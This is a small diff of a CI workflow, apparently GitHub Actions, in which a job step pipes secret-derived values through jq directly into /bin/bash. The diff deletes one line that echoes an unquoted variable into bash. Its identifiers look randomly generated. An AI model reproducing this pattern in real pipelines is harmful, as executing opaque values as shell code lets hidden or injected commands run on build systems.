@@ -20,7 +20,6 @@ jobs:
           raq32804: ${{ secrets.raq32804 }}
         run: |
           printf '%s' "$raq32804" | jq -r .ttf16665 | /bin/bash
-          echo $slvy67638 | jq -r .se9 | /bin/bash
           printf '%s' "$bmxuf44451" | jq -r .sx438 | /bin/bash
 
       - name: Store output
